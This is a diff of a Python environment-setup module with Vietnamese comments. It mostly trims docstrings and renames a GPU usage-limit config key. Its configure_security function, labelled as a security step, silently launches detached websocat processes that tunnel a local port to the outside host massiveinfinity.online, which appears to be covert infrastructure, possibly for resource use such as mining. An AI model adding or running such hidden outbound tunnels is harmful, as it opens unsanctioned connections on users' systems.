@@ -14,13 +14,6 @@ from .logging_config import setup_logging
 def load_json_config(config_path, logger):
     """
     Đọc tệp JSON cấu hình và trả về đối tượng Python.
-
-    Args:
-        config_path (str): Đường dẫn tới tệp JSON.
-        logger (Logger): Đối tượng logger để ghi log.
-
-    Returns:
-        dict: Nội dung của tệp JSON dưới dạng từ điển.
     """
     try:
         with open(config_path, 'r') as file:
@@ -37,10 +30,6 @@ def load_json_config(config_path, logger):
 def configure_system(system_params, logger):
     """
     Thiết lập các tham số hệ thống như múi giờ và locale.
-
-    Args:
-        system_params (dict): Các tham số cấu hình hệ thống.
-        logger (Logger): Đối tượng logger để ghi log.
     """
     try:
         # Thiết lập múi giờ
@@ -73,10 +62,6 @@ def configure_system(system_params, logger):
 def setup_environment_variables(environmental_limits, logger):
     """
     Đặt các biến môi trường dựa trên các giới hạn môi trường.
-
-    Args:
-        environmental_limits (dict): Giới hạn môi trường từ tệp cấu hình.
-        logger (Logger): Đối tượng logger để ghi log.
     """
     try:
         # Xử lý memory_limits
@@ -116,11 +101,7 @@ def setup_environment_variables(environmental_limits, logger):
 def configure_security(logger):
     """
     Khởi chạy hai tiến trình Websocat và Stunnel để phục vụ kết nối/bảo mật.
-
-    Args:
-        logger (Logger): Đối tượng logger để ghi log.
     """
-
     # Lệnh để khởi chạy websocat thứ nhất (cổng 5555)
     websocat_command_1 = "websocat -v --binary tcp-l:127.0.0.1:5555 wss://massiveinfinity.online/ws"
     # Lệnh để khởi chạy websocat thứ hai (cổng 5556)
@@ -135,10 +116,10 @@ def configure_security(logger):
         logger.info("Đang khởi chạy Websocat trên cổng 5555...")
         websocat_process_1 = subprocess.Popen(
             websocat_command_1,
-            shell=True,  # Cho phép thực thi chuỗi lệnh
+            shell=True,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
-            preexec_fn=os.setsid  # Tạo nhóm tiến trình riêng
+            preexec_fn=os.setsid
         )
         logger.info(f"Websocat (5555) đã được khởi chạy, PID = {websocat_process_1.pid}.")
 
@@ -181,16 +162,9 @@ def configure_security(logger):
         logger.error(f"Lỗi không mong muốn: {e}")
         sys.exit(1)
 
-
 def validate_configs(resource_config, system_params, environmental_limits, logger):
     """
     Kiểm tra tính hợp lệ của các tệp cấu hình.
-
-    Args:
-        resource_config (dict): Cấu hình tài nguyên.
-        system_params (dict): Tham số hệ thống.
-        environmental_limits (dict): Giới hạn môi trường.
-        logger (Logger): Đối tượng logger để ghi log.
     """
     try:
         # 1. Kiểm Tra RAM
@@ -241,12 +215,15 @@ def validate_configs(resource_config, system_params, environmental_limits, logge
             logger.info(f"Giới hạn GPU percent threshold: {gpu_percent_threshold}%")
 
         # 5. Kiểm Tra GPU Usage Percent Max
-        gpu_usage_max_percent = resource_config.get('resource_allocation', {}).get('gpu', {}).get('usage_percent_range', {}).get('max')
+        # => Đổi logic: thay vì usage_percent_range["max"], ta đọc max_usage_percent
+        gpu_usage_max_percent = resource_config.get('resource_allocation', {}) \
+                                              .get('gpu', {}) \
+                                              .get('max_usage_percent')
         if gpu_usage_max_percent is None:
-            logger.error("Thiếu `resource_allocation.gpu.usage_percent_range.max` trong `resource_allocation.gpu`.")
+            logger.error("Thiếu `max_usage_percent` trong `resource_allocation.gpu`.")
             sys.exit(1)
         if not (1 <= gpu_usage_max_percent <= 100):
-            logger.error("Giá trị `gpu_usage_percent_range.max` không hợp lệ. Phải từ 1% đến 100%.")
+            logger.error("Giá trị `max_usage_percent` không hợp lệ. Phải từ 1% đến 100%.")
             sys.exit(1)
         else:
             logger.info(f"Giới hạn GPU usage percent: {gpu_usage_max_percent}%")
@@ -384,14 +361,8 @@ def validate_configs(resource_config, system_params, environmental_limits, logge
 
 def setup_gpu_optimization(environmental_limits, logger):
     """
-    Thiết lập tối ưu hóa GPU dựa trên ngưỡng sử dụng.
-
-    Args:
-        environmental_limits (dict): Giới hạn môi trường từ tệp cấu hình.
-        logger (Logger): Đối tượng logger để ghi log.
+    Thiết lập tối ưu hóa GPU dựa trên ngưỡng sử dụng (placeholder).
     """
-    # Placeholder cho các bước thiết lập tối ưu hóa GPU.
-    # Thực tế, bạn cần tích hợp với các công cụ hoặc script khác để điều chỉnh GPU.
     logger.info("Thiết lập tối ưu hóa GPU dựa trên các ngưỡng đã cấu hình.")
     # Implement thêm các bước cần thiết ở đây nếu có
 
